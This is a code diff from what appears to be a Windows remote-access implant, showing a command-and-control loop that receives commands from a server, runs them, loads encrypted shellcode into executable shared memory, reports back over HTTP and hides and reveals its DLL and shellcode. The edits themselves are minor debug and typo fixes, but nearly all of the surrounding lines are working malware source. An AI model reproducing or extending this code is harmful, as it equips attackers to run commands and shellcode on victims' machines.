@@ -126,14 +126,14 @@ BOOL contact_cnc(){
 				shellcodeMemPointer = MapViewOfFile(shellcodeMemHandle, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
 
 #ifdef _DEBUG
-			MessageBoxA(NULL, "Sleeping Zzzzzz", "DLL and shellcode (if loaded) is now visible for the defined number of seconds.", MB_OK);
+			MessageBoxA(NULL, "DLL and shellcode (if loaded) is now visible for the defined number of seconds.", "Sleeping Zzzzzz", MB_OK);
 			printf("[+] DLL and shellcode (if loaded) is now visible. Sleeping for %d milli seconds.\n", reveal_command_timeout);
 #endif
 			send_http("DLL and shellcode (if loaded) is now visible. Sleeping initiated...", upload_path);
 			Sleep(reveal_command_timeout);
 
 #ifdef _DEBUG
-			MessageBoxA(NULL, "Sleeping Zzzzzz", "Sleeping done. Time to rehide.", MB_OK);
+			MessageBoxA(NULL, "Sleeping done. Time to rehide.", "Sleeping Zzzzzz", MB_OK);
 			printf("[+] Sleeping done. Time to rehide.\n");
 #endif
 			send_http("Sleeping done. Time to rehide.", upload_path);
@@ -146,7 +146,7 @@ BOOL contact_cnc(){
 			result = execute_this(received_command);
 		}
 
-		// loads the given shellocde in a separate shared memory segment
+		// loads the given shellcocde in a separate shared memory segment
 		else if (strcmp(received_command.command, load_shellcode_cmdstring) == 0){
 #ifdef _DEBUG
 			printf("Starting shellcode loading...\n");
@@ -166,7 +166,7 @@ BOOL contact_cnc(){
 			else{
 #ifdef _DEBUG
 				MessageBoxA(NULL, "Something went wrong while loading shellcode.", "load_shellocde:", MB_OK);
-				printf("Something went wrong while loading shellcode.");
+				printf("Something went wrong while loading shellcode.\n");
 #endif
 				send_http("Something went wrong while loading shellcode.", upload_path);
 				result = FALSE;
@@ -273,14 +273,24 @@ std::string exec(const char* cmd) {
 
 HANDLE load_given_shellcode(command_struct received_command){
 
+#ifdef _DEBUG
+	printf("Creating file mapping with a size of %d for shellcode.\n", received_command.buffer_size);
+#endif
 	HANDLE sharedMemHandle = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, received_command.buffer_size, NULL);
-	
+
 	if (sharedMemHandle){
+#ifdef _DEBUG
+		printf("Creation was successfull.\n");
+#endif
 		LPVOID shellcodeMemPointer = MapViewOfFile(sharedMemHandle, FILE_MAP_ALL_ACCESS, 0, 0, 0);
 		memcpy(shellcodeMemPointer, received_command.buffer, received_command.buffer_size);
 		endecrypt_inplace((char*)shellcodeMemPointer, received_command.buffer_size, secret);
 		UnmapViewOfFile(shellcodeMemPointer);
 	}
+#ifdef _DEBUG
+	else
+		printf("Creation failed.\n");
+#endif
 	return sharedMemHandle;
 }
 
